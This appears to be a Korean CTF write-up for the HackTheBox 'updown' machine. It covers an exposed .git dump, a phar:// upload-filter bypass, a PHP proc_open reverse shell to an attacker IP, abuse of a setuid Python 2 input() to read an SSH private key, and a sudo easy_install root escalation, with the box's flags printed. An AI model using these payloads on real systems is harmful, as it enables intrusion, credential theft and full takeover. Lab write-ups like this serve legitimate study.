---
slug: "updown"
title: "updown"
date: 2026-07-07
category: "HTB"
tags: []
excerpt: "간단하게 내 서버를 하나 열어줌 ~~~sh python3 -m http.server 8000 ~~~ 디버그 모드 on/off 가 있길래 이걸 키고 ~~~…"
readingTime: 16
---

#### Box: updown | Linux | Medium
날짜: 2026 07 06
소요시간:

##### Open Ports
22
80
##### Interesting Services
80번 포트를 들어가보니까 siteisup 이라는 사이트가 뜸 사이트가 올라왔는지 확인해주는 사이트인듯 함 

간단하게 내 서버를 하나 열어줌
~~~sh
python3 -m http.server 8000
~~~
디버그 모드 on/off 가 있길래 이걸 키고
~~~
http://{ip}:8000/kimbell.txt

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.12
Date: Mon, 06 Jul 2026 05:04:35 GMT
Content-type: text/plain
Content-Length: 16
Last-Modified: Mon, 06 Jul 2026 05:04:10 GMT

hi im kimbell~!
~~~
- 이런 식으로 나옴 -> 일단 내 서버에 신호를 보낸다는거니까 
- localhost 그니까 자기 자신에게도 뭔가를 보냄
		-> 이 두개를 어떻게 이용해볼 수 있을거 같은디 .... 
- `gobuster common.txt => /dev`라는 페이지가 열려있다는 걸 알 수 있었음
- burp로는 딱히 얻을 정보가 없어보임

이거 넣으니까 
~~~html
<script>alert(1)</script>
~~~
-> Hacking attempt was detected !  요런 문구가 뜨네? 뭔가 stored xss 같은디?
그냥 url 형식이 아니면 무적권 이 문자가 뜸
~~~
http://localhost/<script>alert(1)</script>
~~~
-> 이러면 XSS는 됨
![[Pasted image 20260706142724.png|368]]
근데 또 입력칸이 공백을 필터링 하는 듯 함
	-> 뭔가 xss로 리버스쉘을 실행한다 던지 아니면 커맨드를 실행하는 그런게 있어야될거 같은디 그런건 없는 듯 함함

##### Initial Foothold
벡터:
명령어:
일단 아까 나온 dev 디렉토리에 대해서 또 한번 gobuster ㄱㄱ
~~~sh
gobuster dir -u http://siteisup.htb/dev -w /usr/share/seclists/Discovery/Web-Content/common.txt
~~~
-> **중요:** .git 이 있음!!
이떈 이런 식으로 덤프 까볼 수 있음(소스코드 확인 가능)
[요기 참고바람 1](https://medium.com/@mahad.ahmed0x1/hacking-exposed-git-directories-because-developers-still-dont-learn-095de0b96e2c)
[요기 참고바람 2](https://exploitnotes.org/exploit/version-control/git/index.html#check-information)
```sh
gobuster vhost -u http://siteisup.htb/dev -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
```
-> 여기도 dev.siteisup.htb가 있다고 함
~~~sh
#/dev/.git이니까 dev.siteisup.htb에 대한 .git인거임
git-dumper http://siteisup.htb/dev/.git/ ./dumped

#요걸로 커밋 로그 확인 가능
git log --pretty=oneline
#요걸로 커밋 했던 내용들 볼 수 있음
git show <커밋_id>
#요걸로 당시 커밋 버전으로 왔다갔다 가능
git checkout <커밋_id>
~~~

**index.php**
~~~php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
~~~
-> 일단 여기선 page에 특정 형식이 만족되면 **php 파일을 실행하고** 아니면 checker.php를 킨다고 함

**admin.php**
~~~php
<?php
if(DIRECTACCESS){
        die("Access Denied");
}
#ToDo
?>
~~~
-> 직접 접근은 거부함

**.htaccess**
htaccess: 디렉토리 별 설정을 변경 할 수 있는 놈임
```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
-> **Special-Dev: only4dev** 라는 특별한 헤더를 포함하면 접속 할 수 있다고 함

**checker.php 요약**
checker.php 내용을 보니 post방식으로 check에 들어가면 파일을 올릴 수 있는 곳이 있다고 함
```php
#파일 형식 필터링이 있음
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext))

# 받은 파일저장할 디렉토리 생성
$dir = "uploads/".md5(time())."/";

# 업로드 된 파일 저장하고 한줄씩 읽으면서 살아 있는지 요청을 보냄
# Read the uploaded file.
$final_path = $dir.$file;
$websites = explode("\n",file_get_contents($final_path));

#그리고 마지막에 파일을 삭제도 해
# Delete the uploaded file.
@unlink($final_path);
```
->http://dev.siteisup.htb/uploads/ 업로드 디렉토리 존재
-> 매직바이트 검사는 안하는걸 알 수 있음
-> phar 형식도 php파일 형식 중에 하나여서 우회할 수 있다고 함
-> zip 파일 확장자 조작해서 압축할 수 있음
![[Pasted image 20260707163523.png|144]]

일단 dev.siteisup.htb 접속부터 burp 이용해서 ㄱㄱ  -> 확장프로그램 이용도 ㄱㄴ

![[Pasted image 20260706185324.png|401]]
-> 두둥 !

그리고 코드를 보면 매직바이트 검사는 안하는걸 알 수 있으니 아래와 같이 할 수도 있음
- zip 파일의 확장자를 조작해서 압축할 수 있음
- phar 형식도 php파일 형식 중에 하나여서 우회할 수 있다고 함
[php 필터링 우회](https://medium.com/@abdelaazizbenafghoul/bypassing-extension-and-mime-type-filters-in-file-upload-attacks-d099dc7cb4c6)

**phar :** 
PHP에는 `file://`, `http://`, `php://` 같은 스트림 래퍼가 있는데, `phar://`도 그 중 하나임
`phar://아카이브/파일`  -> 이걸 사용해 zip 파일 안에 내용을 볼 수 있는 wrapper임

**정리:**
1. 파일을 읽는데 안에 있는 url의 상태를 하나씩 본다
2. 파일의 형식은 php는 안되지만 phar은 된다.
3. zip파일의 경우 phar wrapper로 읽을 수 있고, index.php에서 실행이 가능하다
**실행**

쉘이 안켜져서 phpinfo()를 먼저 읽어봄
~~~php
<?php phpinfo(); ?>
~~~
~~~sh
#다른 확장자로 압축 텍스트가 긴 애까지 압축해야 시간이 편함
zip exploit.k info.php kimbell.txt


#이후 uploads에 들어가서 디렉토리 이름 확인 admin에 가서 아래와 같이 입력
http://dev.siteisup.htb/index.php/?page=phar://uploads/{dir_name}/exploit.k/info
~~~

들어와서 보면 이런게 있음
![[Pasted image 20260707164352.png]]

[dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser/tree/master) : 이 툴 사용하면 phpinfo에 기록된 못쓰는 기능 중에 해당 목록에 없는 위험한 함수를 추릴 수 있음
해당 페이지에 들어오게 하려면 헤더 값 추가해줘야 되니까 추가 해줌
![[Pasted image 20260707164814.png|367]]
~~~sh
python2 dfunc-bypasser.py --url http://dev.siteisup.htb/index.php/?page=phar://uploads/c445bd12129d20543f7a30caa8188acc/exploit.k/info

-> 결과 : proc_open
~~~

그럼 proc_open으로 쉘을 쓸 수 있는 방법을 찾아보고 아래 코드 작성
~~~php
<?php
    $cmd = "bash -c 'bash -i >& /dev/tcp/10.10.15.230/5555 0>&1'";
    // Use proc_open to execute the command
    $descriptors = [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w']  // stderr
    ];

    $process = proc_open($cmd, $descriptors, $pipes);

    if (is_resource($process)) {
        // Read the output and errors
        $output = stream_get_contents($pipes[1]);
        $errors = stream_get_contents($pipes[2]);

        // Close the pipes
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        // Close the process
        proc_close($process);
    }
?>
~~~
이거 넣고 위에 과정 다시 반복
~~~sh
nc -lnvp 5555
~~~
이러면 쉘 성공
![[Pasted image 20260707165619.png]]

##### Privilege Escalation (webshell -> developer)
벡터:
명령어:
![[Pasted image 20260707165848.png]]
-> developer라는 유저가 있다고 함, 아쉽게도 user.txt는 못봄

/dev라는 곳이 있는데 이 안에 python파일과 정체모를 파일이 하나 있음
![[Pasted image 20260707170520.png]]
코드 내용은 간단한데 둘다 실행하면 그냥 꺼져 버림
https://dokhakdubini.tistory.com/476
여길 읽어보면 python2는  input을 통해서 eval함수를 실행하는 바람에 builtin함수를 이용할 수 있다고 함
~~~sh
www-data@updown:/home/developer/dev$ python --version
Python 2.7.18
~~~
마침 파이썬 2고 
```sh
www-data@updown:/home/developer/dev$ ls -al
ls -al
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30  2022 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
```
-> 해당 파일을 실행 후 빌트인 함수로 쉘을 실행하면 developer 권한으로 쉘을 얻을 수 있을 듯

하지만 웹쉘이 불편한 관계로 ssh 개인키를 읽고 실행하기로 결정
~~~sh
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
__builtins__.__dict__['__import__']("os").system("cat /home/developer/.ssh/id_rsa")
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw
.
.
.
N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
-----END OPENSSH PRIVATE KEY-----

#칼리에서 붙여넣기
nano id_rsa
ssh -i ./id_rsa developer@10.129.227.227

#접속 성공 후
cat user.txt
~~~
**user.txt :** 243532db91dff54bf387b932ef4e6bb5

##### Privilege Escalation (developer -> root)
벡터:
명령어:
![[Pasted image 20260707172151.png]]

실행해보니 
~~~sh
sudo /usr/local/bin/easy_install
error: No urls, filenames, or requirements specified (see --help
~~~
다음과 같길래 내 서버에 파일을 열고 아무 파일 경로나 넣어 봤음
~~~sh
#칼리에서
python3 -m http.server 8000

#developer에서 확인해보면 /tmp 디렉토리에 뭔가를 인식하는 걸 볼 수 있음
developer@updown:~$ sudo /usr/local/bin/easy_install http://10.10.15.230:8000/initial.txt
WARNING: The easy_install command is deprecated and will be removed in a future version.
Downloading http://10.10.15.230:8000/initial.txt
Processing initial.txt
error: Not a recognized archive type: /tmp/easy_install-JbGH3H/initial.txt
~~~
-> 해당 경로로 파일을 하나 만들면 되고 위에 코드 보면 알 수 있듯이 easy_install 이라는걸 썻다고 함

이게 뭔지 찾아보다가 gtfobins에서 권한상승코드가 있어서 사용해봄
~~~sh
mkdir easy_install-JbGH3H
cd easy_install-JbGH3H/
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py

sudo /usr/local/bin/easy_install /tmp/easy_install-JbGH3H

-> 루트 권한 획득!
~~~
**root.txt :** 07df695ee44621759430cdf4912b7721
##### Rabbit Hole (막혔던 것)
- phar이 뭔지에 대한 이해
- .git 및 디렉토리 탐색 덜 한거 
- 코드 똑바로 읽기

##### 다음 박스에서 써먹을 것
- gobuster 세부 내용도 탐색하기 (dir 나오면 멈추지 않고 또 한번 그 dir에 돌려보기)
- .git 나오면 `git-dumper`로 dump 따기
- 쉘 사용이 안될땐 phpinfo 보고 금지 함수 확인하기 -> [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser/tree/master) 사용
- 웹쉘 땄다고 그 근처에서 크레덴셜 찾는게 아니라 /home/user 접근 되면 거기서도 권한상승 노려보기
- python 구버전들 나오면 취약한 함수 체크 (python2: input)

---
